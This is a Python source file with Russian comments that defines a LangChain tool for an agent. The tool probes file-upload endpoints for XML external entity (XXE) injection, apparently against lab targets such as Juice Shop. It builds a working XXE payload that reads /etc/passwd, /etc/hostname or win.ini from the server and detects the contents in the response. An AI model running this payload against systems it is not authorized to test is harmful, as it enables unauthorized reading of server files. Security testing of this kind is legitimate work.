"""проверка XXE через загрузку файла или XML-эндпоинт"""
import json
import requests
from langchain.tools import tool


# безопасные для чтения файлы 
SAFE_FILES = [
    "file:///etc/hostname",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]


@tool
def test_xxe_upload(upload_url: str, file_field: str = "file", file_name: str = "xxe.xml",
    extra_fields: str = "", content_type: str = "application/xml", token: str = ""):
    """
    проверить эндпоинт загрузки файла на XXE

    отправляет XML-файл с внешней сущностью, которая читает локальный
    файл на сервере. Если ответ содержит содержимое файла — XXE подтверждён.

    ВАЖНО: HTTP 200 или отсутствие ошибки НЕ доказывает XXE. Доказательство —
    только содержимое файла в ответе (например, "root:x:0:0" для /etc/passwd
    или имя хоста для /etc/hostname).

    используй для эндпоинтов, принимающих файлы (загрузка аватара, отзыва,
    документа). Сначала попробуй file:///etc/hostname (безопасно), затем
    file:///etc/passwd.
    
    upload_url: URL эндпоинта загрузки, например "http://juice-shop:3000/api/Feedbacks"
    file_field: имя поля файла в multipart-запросе (по умолчанию "file")
    file_name: имя загружаемого файла (по умолчанию "xxe.xml")
    extra_fields: дополнительные поля в виде "a=1&b=2" 
    content_type: Content-Type файла (по умолчанию "application/xml")
    token: Bearer-токен (если нужна аутентификация)

    возвращает JSON:
      {"url": ..., "status": ..., "xxe_confirmed": bool, "file_read": ...,
       "evidence": ..., "verdict": ...}
    """
    url = upload_url.rstrip("/")
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    result = {
        "url": url,
        "file_field": file_field,
        "file_name": file_name,
        "content_type": content_type,
        "attempts": [],
        "xxe_confirmed": False,
        "verdict": "requires_verification",
    }

    data = {}
    if extra_fields:
        for kv in extra_fields.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                data[k] = v

    for target_file in SAFE_FILES:
        # формируем XML-payload
        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
                            <!DOCTYPE foo [
                            <!ENTITY xxe SYSTEM "{target_file}">
                            ]>
                            <root><data>&xxe;</data></root>'''

        try:
            files = {
                file_field: (file_name, xml_payload.encode("utf-8"), content_type)
            }
            res = requests.post(
                url,
                files=files,
                data=data,
                headers=headers,
                timeout=20,
            )
        except Exception as e:
            result["attempts"].append({
                "file": target_file,
                "error": str(e),
            })
            continue

        body = (res.text or "")
        attempt = {
            "file": target_file,
            "status": res.status_code,
            "body_len": len(body),
            "body_preview": body[:500],
        }

        # ============ проверка доказательств XXE ============
        # /etc/passwd — ищем "root:x:0:0"
        if "passwd" in target_file and "root:x:0:0" in body:
            attempt["evidence"] = "содержимое /etc/passwd в ответе"
            result["xxe_confirmed"] = True
            result["file_read"] = target_file
            result["evidence"] = attempt["evidence"]

        # /etc/hostname — ищем непустую строку 
        elif "hostname" in target_file and body.strip():
            if "error" not in body.lower() and len(body.strip()) < 200:
                attempt["evidence"] = f"возможное имя хоста: {body.strip()[:100]}"
                result["xxe_confirmed"] = True
                result["file_read"] = target_file
                result["evidence"] = attempt["evidence"]

        # win.ini — ищем "[fonts]" или "[extensions]"
        elif "win.ini" in target_file and ("[fonts]" in body or "[extensions]" in body):
            attempt["evidence"] = "содержимое win.ini в ответе"
            result["xxe_confirmed"] = True
            result["file_read"] = target_file
            result["evidence"] = attempt["evidence"]

        result["attempts"].append(attempt)

        if result["xxe_confirmed"]:
            break

    # ============ результат ============
    if result["xxe_confirmed"]:
        result["verdict"] = (
            f"XXE ПОДТВЕРЖДЁН: прочитан {result['file_read']}. "
            f"Доказательство: {result.get('evidence', '')}"
        )
    else:
        reflected = any(
            "<!ENTITY" in a.get("body_preview", "") or "xxe" in a.get("body_preview", "").lower()
            for a in result["attempts"]
        )
        if reflected:
            result["verdict"] = (
                "requires_verification: XML-payload отражён, но содержимое "
                "файла не вернулось. Возможно, сущности отключены или "
                "файл недоступен."
            )
        else:
            result["verdict"] = (
                "ОК: содержимое файла не вернулось. XXE не подтверждён."
            )

    return json.dumps(result, ensure_ascii=False, indent=2)